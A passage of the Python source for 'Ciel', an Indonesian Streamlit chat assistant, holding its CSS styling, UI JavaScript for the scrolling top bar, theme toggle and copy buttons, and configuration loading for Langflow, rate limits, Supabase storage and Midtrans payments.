.ciel-srcs { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 0.2rem; }
.stApp a.ciel-src {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
    max-width: 100%;
    height: 2rem;
    padding: 0 0.75rem 0 0.375rem;
    border-radius: var(--r-pill);
    background: var(--c-surface);
    font-size: 0.8125rem;
    color: var(--c-text);
    text-decoration: none;
    transition: background-color 0.3s var(--ease);
}
.stApp a.ciel-src:hover { background: var(--c-raised); color: var(--c-text); }
.ciel-src b, .ciel-ri b {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    flex: none;
    min-width: 1.25rem;
    height: 1.25rem;
    padding: 0 0.3rem;
    border-radius: 6px;
    background: var(--c-accent);
    color: var(--c-accent-ink);
    font-size: 0.75rem;
    font-weight: 600;
}
.ciel-src span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--c-muted); }
.ciel-rail { display: flex; flex-direction: column; gap: 1.6rem; padding-top: 0.2rem; }
.stApp .ciel-rail h2 {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    margin: 0 0 0.6rem;
    padding: 0;
    font-family: var(--font-sans);
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--c-text);
}
/* Streamlit wraps heading text in its own span and adds anchor links. */
:is(.ciel-rail, .ciel-chathead) [data-testid="stHeaderActionElements"] { display: none; }
.ciel-rail h2 .ciel-count { padding: 0 0.5rem; border-radius: var(--r-pill); background: var(--c-raised); font-size: 0.75rem; font-weight: 400; line-height: 1.25rem; color: var(--c-muted); }
.stApp .ciel-rail-q { margin: 0.6rem 0 0.35rem; font-size: 0.75rem; color: var(--c-faint); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.stApp a.ciel-ri, .ciel-gap {
    display: flex;
    align-items: flex-start;
    gap: 0.6rem;
    margin-bottom: 0.4rem;
    padding: 0.6rem 0.75rem;
    border-radius: 14px;
    background: var(--c-surface);
    box-shadow: inset 0 0 0 1px var(--c-line);
    font-size: 0.875rem;
    line-height: 1.4;
    color: var(--c-text);
    text-decoration: none;
}
.stApp a.ciel-ri:hover { background: var(--c-raised); color: var(--c-text); }
.ciel-ri strong { display: block; font-weight: 500; overflow-wrap: anywhere; }
.ciel-ri em { display: block; margin-top: 0.1rem; font-style: normal; font-size: 0.75rem; color: var(--c-faint); }
.ciel-gap { background: var(--c-gap-bg); box-shadow: inset 0 0 0 1px rgba(233, 208, 106, 0.18); }
.ciel-gap i { flex: none; width: 0.9rem; height: 0.9rem; margin-top: 0.15rem; border-radius: 4px; background: var(--c-gold); }
.ciel-mc { display: inline-flex; align-items: center; height: 1.75rem; margin: 0 0.35rem 0.35rem 0; padding: 0 0.75rem; border-radius: var(--r-pill); background: var(--c-surface); font-size: 0.8125rem; color: var(--c-text); }
.ciel-kv { margin: 0; }
.ciel-kv div { display: flex; justify-content: space-between; gap: 0.75rem; padding: 0.35rem 0; border-bottom: 1px solid var(--c-line); font-size: 0.875rem; }
.ciel-kv dt { color: var(--c-muted); }
.ciel-kv dd { margin: 0; font-weight: 500; color: var(--c-text); }
/* [Dugaan]/[Terverifikasi] badges: Streamlit paints them inline from its
   base theme; UI_JS tags them by text so they follow the tokens. */
.stMarkdownBadge.ciel-guess { background: var(--c-gold) !important; color: var(--c-gold-ink) !important; }
.stMarkdownBadge.ciel-ok { background: var(--c-accent-soft) !important; color: var(--c-accent) !important; }
/* Copy button (UI_JS adds it under finished answers). */
.ciel-copy {
    margin-top: 0.5rem;
    height: 2rem;
    padding: 0 0.875rem;
    border: 0;
    border-radius: var(--r-pill);
    background: var(--c-raised);
    color: var(--c-text);
    font: 500 0.8125rem var(--font-sans);
    cursor: pointer;
    transition: background-color 0.3s var(--ease);
}
.ciel-copy:hover { background: var(--c-raised-strong); }
.ciel-copy:focus-visible { outline: 2px solid var(--c-accent); outline-offset: 2px; }
/* With the rail the page widens; the composer stays under the conversation. */
.stMain .block-container:has(.st-key-rail) { max-width: 78rem; }
body:has(.st-key-rail) [data-testid="stBottomBlockContainer"] { max-width: 78rem; }
@media (min-width: 1200px) {
    body:has(.st-key-rail) [data-testid="stBottomBlockContainer"] [data-testid="stChatInput"] { width: 68%; }
    /* The rail stays in view while a long chat scrolls. Streamlit wraps the
       keyed container in a wrapper exactly as tall as it, so the wrapper is
       what sticks (its parent spans the whole column). */
    [data-testid="stColumn"]:has(.st-key-rail) { align-self: stretch; }
    [data-testid="stLayoutWrapper"]:has(> .st-key-rail) {
        position: sticky;
        top: 4.5rem;
    }
    .st-key-rail {
        max-height: calc(100vh - 11rem);
        overflow-y: auto;
        overscroll-behavior: contain;
    }
}
@media (max-width: 1199px) {
    [data-testid="stHorizontalBlock"]:has(> [data-testid="stColumn"] .st-key-rail) { flex-direction: column; }
    [data-testid="stHorizontalBlock"]:has(> [data-testid="stColumn"] .st-key-rail) > [data-testid="stColumn"] { width: 100% !important; flex: 1 1 auto !important; }
}

/* ---------- Working indicator ---------- */
.ciel-thinking { max-width: 26rem; padding: 0.2rem 0 0.4rem; }
.ciel-thinking-head { font-size: 0.92rem; font-weight: 500; }
.ciel-thinking-head::after {
    content: "";
    display: inline-block;
    width: 0.5ch;
    height: 1em;
    margin-left: 0.4ch;
    vertical-align: -0.15em;
    background: var(--c-accent);
    animation: ciel-caret 1.1s steps(1) infinite;
}
.ciel-skel { display: grid; gap: 0.5rem; margin: 0.9rem 0 0.7rem; }
.ciel-skel b {
    position: relative;
    display: block;
    height: 0.6rem;
    border-radius: 3px;
    background: var(--c-raised);
    overflow: hidden;
}
.ciel-skel b:nth-child(1) { width: 100%; }
.ciel-skel b:nth-child(2) { width: 86%; }
.ciel-skel b:nth-child(3) { width: 58%; }
.ciel-skel b::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(90deg, transparent, var(--c-shimmer), transparent);
    transform: translateX(-100%);
    animation: ciel-shimmer 1.7s var(--ease) infinite;
}
.ciel-thinking-note { margin: 0; font-size: 0.8rem; color: var(--c-faint); }

/* ---------- Error card ---------- */
[class*="st-key-errcard"] {
    padding: 0.95rem 1.05rem;
    border: 1px solid rgba(163, 59, 44, 0.25);
    border-left: 3px solid var(--c-err);
    border-radius: var(--r-md);
    background: rgba(163, 59, 44, 0.05);
    max-width: 44rem;
}
.ciel-errhead { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.35rem; }
.ciel-errhead strong { font-size: 0.98rem; font-weight: 600; }
.ciel-badge {
    padding: 0.1rem 0.45rem;
    border-radius: 3px;
    background: rgba(163, 59, 44, 0.12);
    color: var(--c-err);
    font-size: 0.7rem;
    font-weight: 500;
}
[class*="st-key-errcard"] [data-testid="stExpander"] {
    border: 1px solid var(--c-line);
    border-radius: var(--r-md);
    background: var(--c-bg);
    margin: 0.5rem 0 0.7rem;
}

/* ---------- Composer ---------- */
[data-testid="stBottom"] > div,
[data-testid="stBottomBlockContainer"] {
    background: linear-gradient(to top, var(--c-bg) 70%, transparent);
}
[data-testid="stBottomBlockContainer"] { max-width: 50rem; padding-bottom: 1.4rem; }
/* The floating tray: the input core (22px corners) inside a 6px ring of
   the surface colour with a hairline, like the artifact's composer. */
[data-testid="stChatInput"] {
    border: 1px solid var(--c-line-strong);
    border-radius: 22px;
    background: var(--c-raised);
    box-shadow: 0 0 0 6px var(--c-surface), 0 0 0 7px var(--c-line), 0 24px 48px -24px rgba(0, 0, 0, 0.55);
    transition: border-color 0.4s var(--ease);
}
[data-testid="stChatInput"] > div { background: transparent; border: 0; }
[data-testid="stChatInput"] div:has(textarea) { background: transparent; }
[data-testid="stChatInput"]:focus-within { border-color: var(--c-accent); }
/* The composer's own border is the focus indicator; the global
   focus-visible outline drew a second box around the textarea inside it. */
.stApp [data-testid="stChatInput"] textarea:focus,
.stApp [data-testid="stChatInput"] textarea:focus-visible { outline: none; box-shadow: none; }
[data-testid="stChatInput"] textarea { color: var(--c-text); font-size: 0.98rem; }
[data-testid="stChatInput"] textarea::placeholder { color: var(--c-faint); }
[data-testid="stChatInputSubmitButton"] {
    border-radius: var(--r-pill);
    background: var(--c-primary);
    color: var(--c-on-primary);
    transition: transform 0.4s var(--ease);
}
[data-testid="stChatInputSubmitButton"]:active { transform: translateY(1px); }
[data-testid="stChatInputSubmitButton"]:disabled { background: var(--c-raised); color: var(--c-faint); }

/* ---------- Projects, history, files ---------- */
[data-testid="stSidebar"] .stButton > button,
[data-testid="stSidebar"] [data-testid="stPopover"] > button { width: 100%; }
.st-key-projects .stButton > button,
.st-key-history .stButton > button {
    justify-content: flex-start;
    text-align: left;
    border-color: transparent;
    border-radius: 8px;
    color: var(--c-muted);
    min-height: 2.2rem;
}
.st-key-projects .stButton > button:hover,
.st-key-history .stButton > button:hover {
    background: var(--c-raised);
    color: var(--c-text);
    border-color: transparent;
}
[class*="st-key-projactive_"] .stButton > button,
[class*="st-key-chatactive_"] .stButton > button,
.stButton[class*="st-key-projactive_"] > button,
.stButton[class*="st-key-chatactive_"] > button {
    background: var(--c-raised);
    border-color: transparent;
    color: var(--c-text);
}
.st-key-projects .stButton > button p {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}
/* History rows show whole titles: they wrap, left aligned, instead of being cut. */
.st-key-history .stButton > button { height: auto; padding-top: 0.45rem; padding-bottom: 0.45rem; text-align: left; }
.st-key-history .stButton > button > div { justify-content: flex-start; min-width: 0; }
.st-key-history .stButton > button p {
    white-space: normal;
    overflow-wrap: anywhere;
    text-align: left;
    line-height: 1.4;
}
/* History row: the title fills the row; the options menu stays small and
   always visible (no hover-only reveal, which touch screens can't reach). */
[class*="st-key-chatrow_"] { flex-wrap: nowrap; align-items: center; gap: 0.25rem; }
[class*="st-key-chatrow_"] > .stElementContainer { flex: 1 1 0; min-width: 0; }
[class*="st-key-chatrow_"] [data-testid="stPopover"] { flex: 0 0 auto; width: auto; }
[data-testid="stSidebar"] [class*="st-key-chatrow_"] [data-testid="stPopoverButton"] {
    width: 2.2rem;
    min-height: 2.2rem;
    padding: 0;
    justify-content: center;
    border-color: transparent;
    background: transparent;
    color: var(--c-faint);
}
[data-testid="stSidebar"] [class*="st-key-chatrow_"] [data-testid="stPopoverButton"]:hover { color: var(--c-text); background: var(--c-raised); }
/* The ⋯ icon already says "menu"; Streamlit's open/close chevron is noise here. */
[class*="st-key-chatrow_"] [data-testid="stPopoverButton"] > div > div:last-child:not(:first-child) { display: none; }
/* Project files (sidebar) and the draft upload in Cek kutipan (dialog). */
:is([data-testid="stSidebar"], [data-testid="stDialog"]) [data-testid="stFileUploader"] section {
    background: var(--c-bg);
    border: 1px dashed var(--c-control);
    border-radius: var(--r-md);
    color: var(--c-faint);
}
.ciel-projfile {
    display: flex;
    justify-content: space-between;
    gap: 0.6rem;
    margin: 0.5rem 0 0.15rem;
    font-size: 0.8rem;
    color: var(--c-text);
    overflow-wrap: anywhere;
}
.ciel-projfile em { font-style: normal; color: var(--c-faint); font-family: var(--font-mono); font-size: 0.72rem; white-space: nowrap; }
.ciel-files { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.55rem; }
.ciel-filechip {
    padding: 0.18rem 0.55rem;
    border: 1px solid var(--c-line-strong);
    border-radius: var(--r-sm);
    font-family: var(--font-mono);
    font-size: 0.74rem;
    color: var(--c-muted);
    overflow-wrap: anywhere;
}

/* ---------- First-load curtain ---------- */
/* Added to <body> by UI_JS once per browser session; it never takes clicks. */
.ciel-curtain {
    position: fixed;
    inset: 0;
    z-index: 999999;
    pointer-events: none;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--c-bg);
    animation: ciel-curtain 0.8s var(--ease) forwards;
}
.ciel-curtain::before {
    content: "";
    width: 44px;
    height: 44px;
    background: center / contain no-repeat url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath fill='%239db3e8' d='M24.89 10.6A11.8 11.8 0 1 0 24.89 21.4H20.57A8.2 8.2 0 1 1 20.57 10.6Z'/%3E%3Cpath fill='%23e9d06a' d='M28.39 10.6A11.8 11.8 0 0 1 28.39 21.4H24.07A8.2 8.2 0 0 0 24.07 10.6Z'/%3E%3C/svg%3E");
    animation: ciel-curtain-mark 0.8s var(--ease) forwards;
}
@keyframes ciel-curtain { 0%, 35% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
@keyframes ciel-curtain-mark { 0% { opacity: 0; transform: scale(0.85); } 35% { opacity: 1; transform: none; } 100% { opacity: 0; transform: scale(1.12); } }

/* ---------- Motion ---------- */
@keyframes ciel-rise {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
}
@keyframes ciel-caret {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
}
@keyframes ciel-shimmer {
    to { transform: translateX(100%); }
}
@media (prefers-reduced-motion: reduce) {
    .stApp *, .stApp *::before, .stApp *::after {
        animation: none !important;
        transition: none !important;
    }
}

/* ---------- Tablet / phone ---------- */
@media (max-width: 900px) {
    [data-testid="stMain"] .block-container,
    .stMain .block-container { padding: 4rem 1.1rem 8.5rem; }
}
@media (max-width: 640px) {
    [data-testid="stMain"] .block-container,
    .stMain .block-container { padding: 3.75rem 0.9rem 8rem; }
    [data-testid="stChatMessage"] { gap: 0.65rem; }
    [data-testid="stChatMessage"]:has([data-testid="stChatMessageAvatarUser"]) { padding: 0.75rem 0.85rem; }
    [data-testid="stBottomBlockContainer"] { padding-left: 0.7rem; padding-right: 0.7rem; padding-bottom: 1rem; }
    :is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button,
    [data-testid="stSidebar"] [data-testid="stPopover"] > button { min-height: 2.75rem; }
}

/* Streamlit Community Cloud runs the app in an iframe and lays its own
   badges (Streamlit logo, creator avatar) over the bottom-right corner,
   where app CSS can't reach. UI_JS marks that case with data-ciel-hosted;
   where the composer reaches that corner (narrow screens), lift it and the
   end of the chat clear of the badges. */
@media (max-width: 960px) {
    :root[data-ciel-hosted] [data-testid="stBottomBlockContainer"] { padding-bottom: 3.5rem; }
    :root[data-ciel-hosted] .stMain .block-container { padding-bottom: 11.5rem; }
}
</style>
"""

st.markdown(CIEL_CSS.replace("{{{LIGHT_TOKENS}}}", "{" + LIGHT_TOKENS + "}"), unsafe_allow_html=True)

# Top bar that follows the scroll: scrolling down pushes it up behind the
# header pixel for pixel, scrolling up pulls it back, and when scrolling
# stops it glides fully in or out based on the last direction (so a small
# scroll up always brings it back). Writes --ciel-nav-offset on <body>,
# which React never touches, so reruns don't reset it.
#
# The listener sits on `document` in the capture phase, not on the scroll
# container: scroll events don't bubble, but capture still sees them from
# whichever element scrolls. On Streamlit Cloud the app shell can be
# replaced after this script ran, and a listener bound to the old
# section.stMain silently stopped working there. The guard lives on
# `window` so a re-run script doesn't add a second listener.
NAV_SCROLL_JS = """
<script>
(() => {
    if (window.__cielNav) return;
    window.__cielNav = true;

    const body = document.body;
    const SETTLE_MS = 120;
    const wrapper = () => document.querySelector('[data-testid="stLayoutWrapper"]:has(> .st-key-topbar)');
    const range = () => { const w = wrapper(); return w ? w.offsetHeight + 8 : 0; };

    let scroller = null;
    let offset = 0;
    let last = 0;
    let direction = 0;
    let settleTimer = 0;

    // Scroll events already arrive at most once per frame, so write directly.
    const render = (max) => {
        body.style.setProperty('--ciel-nav-offset', `${offset}px`);
        if (offset >= max - 1) body.dataset.cielNav = 'hidden';
        else delete body.dataset.cielNav;
    };

    const settle = () => {
        delete body.dataset.cielNavMoving;
        const max = range();
        offset = direction > 0 && scroller && scroller.scrollTop > max ? max : 0;
        render(max);
    };

    document.addEventListener('scroll', (event) => {
        const target = event.target === document ? document.scrollingElement : event.target;
        const w = wrapper();
        // Only the container that holds the top bar counts (not the sidebar).
        if (!w || !target || !target.contains || !target.contains(w)) return;

        // A container seen for the first time started at the top; the event
        // arrives after it already moved, so counting from its current
        // position would drop the first scroll.
        if (target !== scroller) {
            scroller = target;
            last = 0;
        }

        const y = Math.max(0, target.scrollTop);
        const dy = y - last;
        last = y;
        if (Math.abs(dy) > 2) direction = Math.sign(dy);

        const max = range();
        offset = Math.min(max, Math.max(0, offset + dy), y);

        body.dataset.cielNavMoving = '1';
        render(max);
        clearTimeout(settleTimer);
        settleTimer = setTimeout(settle, SETTLE_MS);
    }, { capture: true, passive: true });

    // Keyboard users tabbing into the nav always see it.
    document.addEventListener('focusin', (event) => {
        const w = wrapper();
        if (w && w.contains(event.target)) { direction = -1; settle(); }
    });
})();
</script>
"""

# Page details Streamlit gives no option for. One observer on <body> keeps
# them applied as Streamlit re-renders:
# - Theme: data-ciel-theme on <html> is "dark" unless the visitor chose
#   light with the toggle (THEME_TOGGLE_HTML); the choice is kept in
#   localStorage, and the page still works (dark) if storage is blocked.
# - Hosted on Streamlit Cloud (inside its iframe): data-ciel-hosted on
#   <html> lets CSS lift the composer above Cloud's corner badges.
# - The chat composer's "+" tooltip lists every accepted extension
#   ("Upload or drag and drop files (TXT, MD, ...)"); it is replaced with a
#   short Indonesian hint, also used as the button's accessible name.
UI_JS = """
<script>
(() => {
    if (window.__cielUi) return;
    window.__cielUi = true;

    const root = document.documentElement;
    const KEY = 'ciel-theme';

    // Inside an iframe means Streamlit Community Cloud, whose badges cover
    // the bottom-right corner (comparing windows is allowed cross-origin).
    if (window.self !== window.top) root.dataset.cielHosted = '1';

    // First-load curtain, once per browser session; skipped when motion is
    // reduced or storage is blocked.
    try {
        const still = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        if (!still && !sessionStorage.getItem('ciel-curtain')) {
            sessionStorage.setItem('ciel-curtain', '1');
            const curtain = document.createElement('div');
            curtain.className = 'ciel-curtain';
            curtain.setAttribute('aria-hidden', 'true');
            document.body.appendChild(curtain);
            setTimeout(() => curtain.remove(), 800);
        }
    } catch (error) { /* no curtain */ }
    const UPLOAD_HINT = 'Lampirkan file atau foto';

    // Dark unless the visitor chose light with the toggle.
    const effectiveTheme = () => root.dataset.cielTheme;

    try {
        const saved = localStorage.getItem(KEY);
        root.dataset.cielTheme = saved === 'light' ? 'light' : 'dark';
    } catch (error) { root.dataset.cielTheme = 'dark'; /* storage blocked */ }

    // "Salin jawaban" under each finished answer (not while Ciel is working,
    // not on error cards). Clipboard API first, execCommand as the fallback;
    // when both fail the button hides itself.
    const fallbackCopy = (value) => {
        const area = document.createElement('textarea');
        area.value = value;
        area.setAttribute('readonly', '');
        area.style.position = 'fixed';
        area.style.opacity = '0';
        document.body.appendChild(area);
        area.select();
        const copied = document.execCommand('copy');
        area.remove();
        return copied;
    };
    // The answer's text plus its source buttons as a "Sumber:" list, read
    // when clicked (Streamlit may have replaced the nodes since).
    const copyText = (answer) => {
        const text = answer.querySelector('[data-testid="stMarkdownContainer"]');
        const sources = [...answer.querySelectorAll('.ciel-srcs a')].map((link) => {
            const number = link.querySelector('b') ? link.querySelector('b').textContent : '';
            const title = link.querySelector('span') ? link.querySelector('span').textContent : '';
            return `[${number}] ${title} ${link.href}`;
        });
        return (text ? text.innerText.trim() : '') + (sources.length ? `\\n\\nSumber:\\n${sources.join('\\n')}` : '');
    };

    const addCopyButtons = () => {
        document.querySelectorAll('[aria-label="Chat message from assistant"]').forEach((answer) => {
            // Streamlit reuses message slots: a slot that now holds an error
            // card or the working indicator loses its old button.
            const stale = answer.querySelector('.ciel-copy');
            if (answer.querySelector('.ciel-thinking, [class*="st-key-errcard"]')) {
                if (stale) stale.remove();
                return;
            }
            if (stale) return;
            const first = answer.querySelector('[data-testid="stMarkdownContainer"]');
            if (!first || !first.innerText.trim()) return;
            const button = document.createElement('button');
            button.type = 'button';
            button.className = 'ciel-copy';
            button.setAttribute('aria-live', 'polite');
            button.textContent = 'Salin jawaban';
            const done = () => {
                button.textContent = 'Tersalin';
                setTimeout(() => { button.textContent = 'Salin jawaban'; }, 1500);
            };
            button.addEventListener('click', () => {
                const value = copyText(answer);
                const failed = () => { if (fallbackCopy(value)) done(); else button.hidden = true; };
                if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(value).then(done, failed);
                else failed();
            });
            answer.appendChild(button);
        });
    };

    const tagBadges = () => {
        document.querySelectorAll('.stMarkdownBadge:not(.ciel-guess):not(.ciel-ok)').forEach((badge) => {
            if (badge.textContent === 'Dugaan') badge.classList.add('ciel-guess');
            else if (badge.textContent === 'Terverifikasi') badge.classList.add('ciel-ok');
        });
    };

    // A template button fills the composer on the next run: focus it then,
    // with the first [...] selected so typing replaces it.
    document.addEventListener('click', (event) => {
        if (!event.target.closest('.st-key-templates button')) return;
        const current = document.querySelector('.st-key-beranda textarea');
        const before = current ? current.value : '';
        let tries = 0;
        const wait = setInterval(() => {
            const box = document.querySelector('.st-key-beranda textarea');
            tries += 1;
            if (box && box.value && box.value !== before) {
                clearInterval(wait);
                box.focus();
                const start = box.value.indexOf('[');
                const end = box.value.indexOf(']', start);
                if (start >= 0 && end > start) box.setSelectionRange(start, end + 1);
            } else if (tries > 40) {
                clearInterval(wait);
            }
        }, 50);
    });

    const apply = () => {
        addCopyButtons();
        tagBadges();
        const label = effectiveTheme() === 'dark' ? 'Ganti ke mode terang' : 'Ganti ke mode gelap';
        document.querySelectorAll('[data-ciel-theme-toggle]').forEach((button) => {
            if (button.getAttribute('aria-label') !== label) {
                button.setAttribute('aria-label', label);
                button.title = label;
            }
        });
        document.querySelectorAll('[data-testid="stTooltipContent"]').forEach((tip) => {
            if (tip.textContent.startsWith('Upload or drag and drop')) tip.textContent = UPLOAD_HINT;
        });
        document.querySelectorAll('[data-testid="stChatInputFileUploadButton"] button').forEach((button) => {
            if (button.getAttribute('aria-label') !== UPLOAD_HINT) button.setAttribute('aria-label', UPLOAD_HINT);
        });
    };

    // "Lebih sedikit" closes a long memory and hands focus back to its summary.
    document.addEventListener('click', (event) => {
        const row = event.target.closest('.ciel-home-less') && event.target.closest('details');
        if (!row) return;
        row.open = false;
        const summary = row.querySelector('summary');
        if (summary) summary.focus();
    });

    document.addEventListener('click', (event) => {
        if (!event.target.closest('[data-ciel-theme-toggle]')) return;
        const next = effectiveTheme() === 'dark' ? 'light' : 'dark';
        root.dataset.cielTheme = next;
        try { localStorage.setItem(KEY, next); } catch (error) { /* keep it for this visit only */ }
        apply();
    });

    new MutationObserver(apply).observe(document.body, { childList: true, subtree: true });
    apply();
})();
</script>
"""

# The icon is drawn in CSS (st.html's sanitizer strips inline SVG); UI_JS
# handles clicks and keeps the accessible name in step with the theme.
THEME_TOGGLE_HTML = (
    '<button type="button" class="ciel-theme-toggle" data-ciel-theme-toggle '
    'aria-label="Ganti tema"></button>'
)

with st.container(key="pagejs"):
    st.html(NAV_SCROLL_JS, unsafe_allow_javascript=True)
    st.html(UI_JS, unsafe_allow_javascript=True)



# ============================================================
# LOAD ENVIRONMENT
# ============================================================

load_dotenv()


# ============================================================
# CONFIG HELPER
# ============================================================

def get_config(name):
    """
    Ambil konfigurasi dari Streamlit Secrets.
    Jika tidak tersedia, fallback ke environment variable.
    """
    try:
        value = st.secrets.get(name)

        if value:
            return str(value).strip()

    except Exception:
        pass

    value = os.getenv(name)

    if value:
        return str(value).strip()

    return None


def get_int_config(name, default):
    value = get_config(name)

    try:
        return max(1, int(value)) if value else default
    except ValueError:
        logger.warning("config_invalid_int name=%s", name)
        return default


def auth_configured():
    """Login Google aktif hanya jika blok [auth] ada di secrets."""
    try:
        return "auth" in st.secrets
    except Exception:
        return False


# ============================================================
# CONFIGURATION
# ============================================================

NGROK_URL = get_config("NGROK_URL")
NGROK_USER = get_config("NGROK_USER")
NGROK_PASSWORD = get_config("NGROK_PASSWORD")
LANGFLOW_API_KEY = get_config("LANGFLOW_API_KEY")
FLOW_ID = get_config("FLOW_ID")

# ID komponen Chat Input di flow Langflow; dipakai untuk mengirim gambar.
CHAT_INPUT_ID = get_config("CHAT_INPUT_ID") or "ChatInput-X8W7I"

# ID komponen memory di flow (v1.3.0); app mengirim pemilik memory lewat tweaks.
MEMORY_SEARCH_ID = get_config("MEMORY_SEARCH_ID") or "CielMemorySearch-BC6pl"
MEMORY_STORE_ID = get_config("MEMORY_STORE_ID") or "CielMemoryStore-uBmzx"

# ID komponen Ciel Table Analyst di flow (v1.5.0); app mengirim file CSV/TSV
# pengguna lewat tweaks agar angkanya dihitung langsung dari file.
TABLE_ANALYST_ID = get_config("TABLE_ANALYST_ID") or "CielTableAnalyst-t4bL3"

# ID komponen Ciel ML Analyst di flow (v1.6.0); menerima file yang sama untuk
# melatih model prediksi atau pengelompokan. Flow lama tanpa node ini
# mengabaikan tweak-nya.
ML_ANALYST_ID = get_config("ML_ANALYST_ID") or "CielMLAnalyst-m7Lq2"

# ID komponen Ciel Dataset Store di flow (v1.7.0): dataset pribadi milik
# pengguna yang login. Kedua analyst juga menerima pemilik agar bisa membaca
# dataset itu.
DATASET_STORE_ID = get_config("DATASET_STORE_ID") or "CielDatasetStore-d4tA5"

# Batas pesan per jam dan per hari untuk menjaga biaya model dan beban backend.
# Batas total anonim mencegah orang melewati batas dengan memuat ulang tab;
# batas total harian semua pengguna adalah rem darurat untuk tagihan API.
RATE_LIMIT_PER_HOUR = get_int_config("RATE_LIMIT_PER_HOUR", 10)
RATE_LIMIT_PER_HOUR_LOGIN = get_int_config("RATE_LIMIT_PER_HOUR_LOGIN", 60)
RATE_LIMIT_PER_DAY_LOGIN = get_int_config("RATE_LIMIT_PER_DAY_LOGIN", 300)
RATE_LIMIT_ANON_TOTAL_PER_HOUR = get_int_config("RATE_LIMIT_ANON_TOTAL_PER_HOUR", 60)
RATE_LIMIT_ANON_TOTAL_PER_DAY = get_int_config("RATE_LIMIT_ANON_TOTAL_PER_DAY", 300)
RATE_LIMIT_TOTAL_PER_DAY = get_int_config("RATE_LIMIT_TOTAL_PER_DAY", 1500)
# Ciel Pro (status di tabel pro_members, docs/chat_store.sql).
RATE_LIMIT_PER_HOUR_PRO = get_int_config("RATE_LIMIT_PER_HOUR_PRO", 150)
RATE_LIMIT_PER_DAY_PRO = get_int_config("RATE_LIMIT_PER_DAY_PRO", 800)
RISET_SKRIPSI_PER_DAY = get_int_config("RISET_SKRIPSI_PER_DAY", 5)
KERANGKA_PER_DAY = get_int_config("KERANGKA_PER_DAY", 10)
CEK_KUTIPAN_PER_DAY = get_int_config("CEK_KUTIPAN_PER_DAY", 20)

AUTH_ENABLED = auth_configured()

# Opsional: tujuan tombol paket berbayar di halaman harga (https:// atau mailto:).
CONTACT_URL = get_config("CONTACT_URL")

# Opsional tapi disarankan sebelum publik: nama pengelola di halaman Privasi
# (UU PDP Pasal 5, identitas pihak yang memproses data).
OPERATOR_NAME = get_config("OPERATOR_NAME")

# Opsional: flow "Ciel Memory Admin" untuk panel "Data saya" (lihat dan hapus
# memory). Tanpa ini panel menyatakan bahwa fitur belum aktif.
MEMORY_ADMIN_FLOW_ID = get_config("MEMORY_ADMIN_FLOW_ID")
MEMORY_ADMIN_NODE_ID = get_config("MEMORY_ADMIN_NODE_ID") or "CielMemoryAdmin-adm1n"

# Lama riwayat pesan disimpan di Langflow (dibersihkan oleh
# tools/prune_chat_history.py); dipakai untuk teks halaman Privasi.
CHAT_RETENTION_DAYS = get_int_config("CHAT_RETENTION_DAYS", 30)

# Opsional: Supabase untuk menyimpan riwayat chat dan proyek sidebar pengguna
# yang login (skema di docs/chat_store.sql). Tanpa ini keduanya hanya hidup
# selama sesi.
SUPABASE_URL = get_config("SUPABASE_URL")
SUPABASE_SERVICE_KEY = get_config("SUPABASE_SERVICE_KEY")

CHAT_STORE = (
    ChatStore(SUPABASE_URL, SUPABASE_SERVICE_KEY)
    if AUTH_ENABLED and SUPABASE_URL and SUPABASE_SERVICE_KEY
    else None
)

# Opsional: flow "Ciel Riset Skripsi" (Pro). Fitur hanya tampil jika flow ini
# dan penyimpanan Supabase (tempat status Pro) sama-sama aktif; menghapus
# secret ini adalah rollback-nya. App mengirim tanggal terbit minimum sumber
# (start_published_date, diterapkan Exa) ke komponen pencarian lewat tweaks.
RESEARCH_FLOW_ID = get_config("RESEARCH_FLOW_ID")
RESEARCH_SEARCH_ID = get_config("RESEARCH_SEARCH_ID") or "CielScholarSearch-r1s3t"
RISET_ENABLED = bool(RESEARCH_FLOW_ID and CHAT_STORE)
# Beberapa putaran pencarian plus laporan panjang; diukur ulang saat uji live.
RESEARCH_TIMEOUT = 420

# Opsional: flow "Ciel Penulis" (Pro): Kerangka Bab 1-3 dari peta sumber,
# tanpa pencarian web (writing.py). Uji live 2026-10-19: 13-16 detik.
WRITER_FLOW_ID = get_config("WRITER_FLOW_ID")
WRITER_ENABLED = bool(WRITER_FLOW_ID and CHAT_STORE)
WRITER_TIMEOUT = 240

# Cek kutipan & kemiripan (Pro) berjalan di app tanpa flow (draft_check.py);
# yang dibutuhkan hanya Supabase untuk status Pro.
CHECK_ENABLED = bool(CHAT_STORE)

# Opsional: pembelian Pro lewat Midtrans Snap (payments.py, docs/PRO.md).
# Server key hanya dipakai di server; MIDTRANS_PRODUCTION=true memakai akun
# produksi, selain itu sandbox. APP_URL adalah alamat publik app untuk tujuan
# kembali setelah bayar (default: alamat yang sedang dibuka).
MIDTRANS_SERVER_KEY = get_config("MIDTRANS_SERVER_KEY")
MIDTRANS_PRODUCTION = (get_config("MIDTRANS_PRODUCTION") or "").lower() == "true"
APP_URL = get_config("APP_URL")
PAYMENTS_ENABLED = bool(MIDTRANS_SERVER_KEY and CHAT_STORE)

# Bersihkan URL
if NGROK_URL:
    NGROK_URL = NGROK_URL.rstrip("/")


# ============================================================
# VALIDATE CONFIG
# ============================================================

missing_config = []

if not NGROK_URL:
    missing_config.append("NGROK_URL")

if not NGROK_USER:
    missing_config.append("NGROK_USER")

if not NGROK_PASSWORD:
    missing_config.append("NGROK_PASSWORD")

